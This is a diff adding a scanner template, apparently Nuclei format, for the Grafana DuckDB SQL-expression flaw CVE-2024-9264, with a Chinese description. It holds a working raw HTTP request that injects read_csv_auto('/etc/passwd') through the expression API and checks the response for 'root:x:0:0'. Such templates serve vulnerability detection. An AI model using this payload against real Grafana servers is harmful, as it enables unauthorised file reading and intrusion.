@@ -1,0 +1,46 @@
+id: grafana-duckdb-expression-rce
+
+info:
+  name: Grafana DuckDB SQL表达式评估远程代码执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    Grafana 的 SQL 表达式实验性功能在处理用户输入的 duckdb 查询时，未对输入内容进行充分验证与净化。该缺陷允许攻击者通过构造恶意查询实现命令注入及本地文件包含攻击。攻击条件要求目标系统 $PATH 环境中存在 duckdb 二进制文件（默认未预装）。具备 VIEWER 权限及以上级别的用户即可触发该漏洞。
+  reference:
+  - CVE-2024-9264
+  tags: Grafana
+
+http:
+- raw:
+  - |
+    POST /api/ds/query?ds_type=__expr__&expression=true&requestId=Q100 HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+    Cookie: grafana_session=a739fa9aeb235f2790f17de00fefe528
+
+    {
+      "from": "1696154400000",
+      "to": "1696345200000",
+      "queries": [
+        {
+          "datasource": {
+            "name": "Expression",
+            "type": "__expr__",
+            "uid": "__expr__"
+          },
+          "expression": "SELECT * FROM read_csv_auto('/etc/passwd');",
+          "hide": false,
+          "refId": "B",
+          "type": "sql",
+          "window": ""
+        }
+      ]
+    }
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
